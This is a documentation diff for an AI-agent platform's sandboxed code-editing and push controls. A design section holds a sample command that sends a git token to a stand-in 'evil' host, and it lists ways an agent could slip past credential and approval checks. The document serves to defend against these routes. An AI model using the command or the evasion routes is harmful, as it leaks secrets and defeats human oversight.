@@ -225,58 +225,299 @@ The caller resolves and the runner relays:
    and retains no master key or database credential.
 
 This keeps secret-store authority and Docker authority in different processes.
-Git checkout uses a workspace askpass helper that reads the job-scoped
-`GIT_TOKEN`; the token is not embedded in a remote URL or repository config.
+Only `cli.repository.checkout` and `cli.repository.push` ever carry
+`GIT_TOKEN`, and both run scripts Jhin wrote. The token reaches git through an
+inline `credential."<git base>".helper` on Jhin's own command line, so it is
+never in a remote URL, never in repository config, and never in a file the
+agent can rewrite.
 
 ## CLI connector policy
 
-| Tool | Risk | Scope keys (all fnmatch) |
-| --- | --- | --- |
-| `cli.command.execute` | write, approvable | connection, command, image, network |
-| `cli.repository.checkout` | write, approvable | connection, repository, image |
-| `cli.test.run` | read | connection, command, image |
-| `cli.file.read` | read | connection, path |
-| `cli.file.write` | write, approvable | connection, path |
+| Tool | Risk | Scope keys (all fnmatch) | Required scope keys |
+| --- | --- | --- | --- |
+| `cli.command.execute` | write, approvable | connection, command, image, network | — |
+| `cli.repository.checkout` | write, approvable | connection, repository, image | connection, repository |
+| `cli.repository.push` | **elevated**, approvable | connection, repository, branch | connection, repository, branch |
+| `cli.test.run` | write, approvable | connection, command, image | — |
+| `cli.file.list` | read | connection, path | — |
+| `cli.file.search` | read | connection, path | — |
+| `cli.file.read` | read | connection, path | — |
+| `cli.file.edit` | write, approvable | connection, path | — |
+| `cli.file.write` | write, approvable | connection, path | — |
 
-A CLI connection stores defaults and an optional GitHub connection reference,
-not a plaintext credential. Deny-by-default remains in force. A grant that
-pins `image` or `network` matches only a call that explicitly carries that
-field; relying on a connection default does not broaden the grant.
+A CLI connection stores defaults, an optional GitHub connection reference, and
+the repositories it may use — not a plaintext credential. Deny-by-default
+remains in force in three independent places: the agent's grants, the
+connection's `allowed_repositories` (enforced by a `ToolValidator` that re-runs
+at policy decision, approval resume and execution bind, so narrowing the list
+invalidates a parked approval), and the scope of the GitHub token itself.
 
-## Giving an agent file editing
+`repository` is always `owner/name`, and neither half may be made of dots
+alone: a `..` segment reads as an ordinary name to a pattern like
+`[\w.-]+/[\w.-]+` and as a directory traversal to everything that joins the
+value onto a path — the clone URL, and the `/repos/<repository>` paths the
+GitHub tools build — which would walk out of the prefix the credential's scope
+was written around. Allow-list entries are matched a segment at a time for the
+same reason (`fnmatch`'s `*` crosses `/`, so `octo*` would otherwise cover
+`octo-labs/anything`); the single entry `*`, which migration 0038 grandfathers
+onto connections that predate the list, still means every repository — but
+never a name that is not one. A
+grant that pins `image` or `network` matches only a call that explicitly
+carries that field; relying on a connection default does not broaden the grant.
+
+## Giving an agent code work
 
 An agent edits code only inside a sandbox job, and the change reaches the
-repository only through `git push` from that sandbox. The minimum setup is:
+repository only through `cli.repository.push` — a script Jhin writes, not a
+command the agent writes. The minimum setup is:
 
-1. **Connections.** A `github` connection (PAT or app) for the repository, and
-   a `cli` connection (auth type `none`) whose `git_connection_id` points at it.
-   Leave the CLI connection's `default_network` at `none`; pushes opt into the
-   bridge per call.
+1. **Connections.** A `github` connection (a fine-grained PAT is the shortest
+   path) for the repository, and a `cli` connection (auth type `none`) whose
+   `git_connection_id` points at it and whose **`allowed_repositories`** lists
+   the repositories this instance may touch. That list is deny-by-default: a
+   CLI connection with an empty list can neither check out nor push anything.
+   Scope the GitHub token to the same repositories — Jhin's allow-list is the
+   one you can edit, GitHub's is the one that cannot be argued with. Leave
+   `default_network` at `none`; only checkout and push reach the bridge, and
+   they set that themselves.
 2. **Grants** (Tools & Access on the agent, or the wizard's **Code editing**
-   preset which issues exactly these with `*` scopes):
+   preset, which issues exactly these):
 
    | Capability | Scope | Why |
    | --- | --- | --- |
    | `cli.repository.checkout` | `connection_id`, `repository` | clone + create the `agent/<task>-<repo>` branch |
-   | `cli.file.read` | `connection_id`, `path` | read files in the checkout |
-   | `cli.file.write` | `connection_id`, `path` | edit files in the checkout |
-   | `cli.test.run` | `connection_id`, `command` | run the test command |
-   | `cli.command.execute` | `connection_id`, `command: "git *"` | `git add/commit/push` with `network: "internet"` |
+   | `cli.file.list` | `connection_id`, `path` | see what is in the repository |
+   | `cli.file.search` | `connection_id`, `path` | find a symbol before reading it |
+   | `cli.file.read` | `connection_id`, `path` | read a page of a file, with a `read_token` |
+   | `cli.file.edit` | `connection_id`, `path` | change part of a file by exact string |
+   | `cli.file.write` | `connection_id`, `path` | write a whole file (needs the `read_token`) |
+   | `cli.test.run` | `connection_id`, `command` | run the test command, always isolated |
+   | `cli.repository.push` | `connection_id`, `repository`, `branch: "agent/*"` | commit and push the working branch |
    | `github.repository.read` | `connection_id`, `repository` | inspect the repository |
-   | `github.pull_request.create` | `connection_id`, `repository` | open the PR from the pushed branch |
+   | `github.pull_request.create` | `connection_id`, `repository`, `base` | open the PR from the pushed branch |
 
-   Do not pin `network` in the `cli.command.execute` grant unless every call
-   carries it; the agent passes `network: "internet"` only for the push.
-3. **Step budget.** A checkout → read → write → test → commit+push → PR →
-   report flow takes seven or more steps; give the agent at least 12.
+   `connection_id` and `repository` are **required** grant scope keys on
+   checkout and push: a bare `cli.*` grant cannot reach a repository.
+   `cli.command.execute` is deliberately **not** in this bundle. It remains in
+   the product as an operator-granted escape hatch for builds and linters, and
+   it never receives a git credential.
+3. **Step budget.** A checkout → list → search → read → test → edit → test →
+   push → PR flow is nine calls before the agent reports back; give the agent
+   at least 12 steps.
 
-What the agent sees: the checkout returns the working branch; `cli.file.write`
-reminds it that the change is sandbox-only until pushed; the fake GitHub (like
-real GitHub) refuses a pull request whose head has no commits beyond the base,
-so a branch created through the refs API without a push cannot produce an
-empty PR. The credential for the push is the GitHub connection's short-lived
-token, injected as job-scoped `GIT_TOKEN` and consumed by the askpass helper —
-it is never written to the workspace or the run record.
+### Why push is its own tool
+
+A grant scope is one `fnmatch` over a shell string, so `command: "git *"` also
+matches `git commit -m x && curl https://evil/?t=$GIT_TOKEN`. No scope on a
+shell string is a boundary. So the tools that hold the credential run scripts
+Jhin writes, and the model supplies no remote, no refspec and no shell. Before
+`cli.repository.push` pushes anything it checks, in order:
+
+0. Jhin's own audit trail carries a `sandbox.checkout.recorded` row for this
+   run naming this repository (`no_checkout_record`). The checkout writes it —
+   base ref, head sha, and the sha256 of `.git/config` as Jhin left it — into a
+   table no sandbox job can reach. Every check below that needs to know what
+   the repository *should* look like reads it from there. The row is written
+   only when all three values are there and well-shaped, and the push refuses
+   a record missing either the base ref or the config sha rather than dropping
+   the comparison that needs it: an incomplete record is no record.
+1. `/workspace/repo` exists (`no_checkout`);
+2. the branch it was asked to push is the one checked out
+   (`branch_not_checked_out`);
+3. the branch is neither `main`, `master`, `HEAD`, nor **the base ref the
+   checkout recorded** (`push_to_base_refused`). Not
+   `refs/remotes/origin/HEAD`: that is the remote's default branch, which is a
+   different question, and it is a ref inside the repository the agent has been
+   editing;
+4. `git config --local` contains only keys a Jhin checkout produces — any
+   `credential.*`, `url.*.insteadOf`, `http.*`, `core.hooksPath`,
+   `core.sshCommand`, `include.*` or `alias.*` stops the push
+   (`repo_config_tampered`, recorded as the audit action
+   `sandbox.repo_config_tampered`, which is a security event and not merely a
+   tool error);
+5. `remote.origin.url` holds **exactly one** value and it is the URL Jhin
+   cloned (`remote_rewritten`). Counting matters: the key is allowed, so a
+   name-only audit passes a remote that has been given a second URL, and
+   `git remote get-url origin` reports only the first by design while
+   `git push origin` delivers to every one of them. The refusal records the
+   URLs it saw, so the audit names where the objects would have gone;
+6. `.git/config` hashes to the sha the checkout recorded
+   (`repo_config_tampered`). This is the catch-all under 4 and 5: whatever a
+   sandbox job did to the file, and by whatever key nobody enumerated, it is
+   not what Jhin left there.
+
+Then the push itself goes to **the URL Jhin computes**, not to the name
+`origin`:
+
+```
+git … push <clone url> refs/heads/<branch>:refs/heads/<branch>
+```
+
+`origin` is a pointer the container owns; the URL is Jhin's. So even with every
+audit above bypassed, a rewritten remote redirects nothing. The push is never
+forced, and the refspec is always `refs/heads/<branch>:refs/heads/<branch>`.
+
+**Nothing in this list asks the container a question it could lie about.** That
+is the rule the whole tool is built on, because between the model's last visible
+action and the human's approval sits `cli.test.run`, whose command is arbitrary
+and whose working directory is the checkout.
+
+### How the credential is delivered
+
+The token is resolved from the GitHub connection named by the CLI connection's
+`git_connection_id` — admin-set, never chosen by a tool call — and injected as
+job-scoped `secret_env["GIT_TOKEN"]`. Jhin's own git command line then carries:
+
+```
+git -c credential.helper= \
+    -c credential."<git base>".helper='!f() { test "$1" = get && { echo username=x-access-token; echo "password=$GIT_TOKEN"; }; }; f' \
+    -c core.hooksPath=/nonexistent <clone|push …>
+```
+
+- the empty `credential.helper=` resets the inherited helper list, so a helper
+  planted anywhere else cannot answer first;
+- git's own URL matcher decides whether the helper runs, so a push to any other
+  host never invokes it;
+- the fallbacks are `GIT_ASKPASS=/bin/false` and `GIT_TERMINAL_PROMPT=0`, both
+  hard errors, so the token is unreachable rather than merely un-echoed;
+- the helper lives on a command line, not in `.git/config`, so it is not in a
+  file the agent can rewrite and it never persists.
+
+Every credentialed job also sets `GIT_CONFIG_NOSYSTEM=1` and
+`GIT_CONFIG_GLOBAL=/dev/null`, so neither a system config nor a planted
+`/workspace/.gitconfig` can contribute a helper.
+
+### `.git` is not reachable through the file tools
+
+Every file tool refuses git's own state three times:
+
+1. `cli/schemas.py` rejects any path with a `.git` segment, a first segment of
+   `.git`/`.gitconfig`/`.gitmodules`, or anything starting `.jhin`;
+2. each file job re-resolves the path with `realpath` inside the sandbox before
+   touching it, so a symlink named something innocent cannot smuggle a write
+   into `.git` or out of the checkout;
+3. the same guard refuses a regular file whose link count is not 1.
+
+The third is the one the first two cannot do. `ln .git/config cfg` creates no
+symlink and adds no path segment: the schema is shown `cfg`, `realpath`
+resolves `cfg` to `<root>/cfg`, and both are telling the truth about a file
+that is also git's. Writing it truncates the shared inode. A regular file the
+file tools may touch has exactly one name; `cli.file.edit` asks its own open
+descriptor (`os.fstat`), so no link can appear between the check and the write.
+
+`.github/**`, `.gitignore` and `.gitattributes` stay editable — they are
+ordinary repository content, and the config-based attacks they might otherwise
+enable are closed by the environment above and by the push-time config audit.
+
+### Approvals
+
+`cli.repository.push` is `ELEVATED`. Under the wizard's default **balanced**
+preset — and under the risk defaults a new agent has before any policy is set —
+that means a human approves the first thing that leaves the sandbox, while
+everything before it runs uninterrupted. **Autonomous runs ELEVATED tools
+automatically**, so the Code-editing bundle also ships an explicit policy rule
+(`capability: "cli.repository.push", action: "approval"`), written both by the
+agent wizard and by the **Code editing** toggle on an agent's Tools & Access
+tab. A capability-matched rule is found before a risk-matched one, so the gate
+holds under Autonomous.
+
+It also survives a later change of mode. An approval **preset** is a statement
+about risk levels — every rule it expands to is `capability: "*"` — so
+`PUT /policy {"preset": …}` (the chat sidebar's mode buttons and the same
+buttons on Tools & Access) restates those rules and keeps the ones a preset
+does not speak for, at the front of the list where first-match reaches them.
+The preset still reads as selected in the UI while such a rule is present, so
+nothing invites a click to "fix" an unselected-looking mode.
+
+Two ways the gate is still absent, both deliberate and both visible on the
+Permissions tab: an agent configured by hand under Autonomous that never
+received the rule, and one whose rules were edited explicitly —
+`PUT /policy {"rules": […]}` persists exactly the list it is given, and that
+is how a rule is deliberately removed.
+
+`github.pull_request.create` stays `WRITE`/auto: push is the gate, and
+prompting twice for one logical action is worse than not.
+
+### Images and networks
+
+`cli.test.run` always runs with `network: "none"`. Its command is arbitrary and
+its working directory is the checkout, so the egress decision is Jhin's, not the
+model's. It is **WRITE** risk for the same reason: it is named after tests, but
+it is a shell that can change any file in the checkout, and a grant scope is one
+`fnmatch` over the string — `"python3 -m pytest*"` matches
+`python3 -m pytest -x; <anything>`. WRITE still runs unattended under Autonomous
+and Balanced, which is deliberate; Restricted, which promises no unattended
+writes, now sees it. Containment is structural rather than risk-level:
+`cli.repository.push` trusts nothing this command could have touched.
+Operators who need networked
+tests grant `cli.command.execute` with a narrow command scope instead.
+
+Images are pre-built on the Docker host and selected by the `image` scope key.
+**The runner never pulls**, so a grant's `image` value can never reach a
+registry.
+
+### How a job reports back
+
+Everything Jhin learns from a job — the checkout's head, base and config sha,
+a file's line count and `read_token`, the shas a push moved — arrives as a
+trailer on the job's stdout, after the payload because the runner keeps the
+*tail* of oversized output. That makes the parser, not the position, the thing
+that has to be trustworthy, because repository content shares the stream:
+`git` allows a newline in a file name, so a repository can hold a file called
+`z⏎JHIN_META` and print a second trailer through any listing of it. Four
+rules, all four needed:
+
+- the sentinel carries a **nonce Jhin draws per job**, which nothing in the
+  container can predict;
+- it must appear **exactly once** — two sentinels mean the stream is ambiguous,
+  and an ambiguous trailer is discarded rather than resolved in favour of
+  whoever printed last;
+- **no content-derived byte is printed inside the region**: every value a
+  repository decides — the checkout's top-level listing, `cli.file.list`'s
+  rows, `cli.file.search`'s matches — is collected before the sentinel and
+  emitted as a single base64 word, so a file name cannot contribute a line
+  break, a key, or a sentinel of its own. Inside the encoding the records are
+  NUL-separated, because NUL is the one byte a path cannot hold: a tab or a
+  colon in a name is then data rather than a field separator, and
+  `cli.file.search` runs `grep -Z` so grep terminates the name with a NUL
+  instead of the `:` the parser used to split on;
+- **exactly one thing emits the sentinel.** A second emitter is how a sentinel
+  and its parser drift apart, and the drift is silent — the trailer simply
+  stops being found and every value read from it comes back empty.
+  `cli.file.edit` shipped that way: the Python program that does the edit wrote
+  the pre-nonce bare marker while the tool parsed the nonce form, so its
+  documented `read_token` was always `""` and the follow-up `cli.file.write`
+  was refused with `file_exists_pass_read_token`. The program now writes only
+  `key=value` lines into a variable and the shell prints the sentinel ahead of
+  them, exactly as every other tool does.
+
+A job whose trailer cannot be read reports nothing rather than something: the
+checkout refuses (`checkout_unrecordable`) and writes no record, which leaves
+the next push with nothing to trust and refuses that too. A listing whose word
+was cut by the size cap reports the rows it could read and says `truncated`.
+
+Refusals travel the other way, as a `JHIN_ERR=` line on stderr, and that stream
+is shared with `git` — which prints file names verbatim. So a `JHIN_ERR` line
+counts only when the job exited with one of the codes Jhin's own scripts
+reserve (65-69). Everything those codes name is reported as *proven side-effect
+free*, and a push that died after touching the remote exits with git's code,
+never one of these.
+
+What the agent sees: the checkout returns the working branch, the base ref it
+was cut from, and the top-level entries, so it can start navigating a
+repository nobody handed it a file path for. Names in every listing are
+repository content, so any character Python does not consider printable is
+shown as `?` — the file tools' schema refuses such a path anyway. That is a
+wider net than "below U+0020" on purpose: `str.splitlines` also breaks on
+U+000B, U+000C, U+001C–U+001E, U+0085 and U+2028/U+2029, so a name carrying one
+of those would otherwise look like one line where it was escaped and like two
+everywhere after. `cli.file.read` returns a line
+window plus `total_lines`, `has_more` and a `read_token` — the sha256 of the
+whole file, computed in the sandbox — and `cli.file.write` requires that token
+back, so reading part of a file and writing back what you read is refused
+rather than silently destroying the rest. The fake GitHub (like real GitHub)
+refuses a pull request whose head has no commits beyond the base, so a branch
+created through the refs API without a push cannot produce an empty PR.
 
 ## Configuration ownership
 
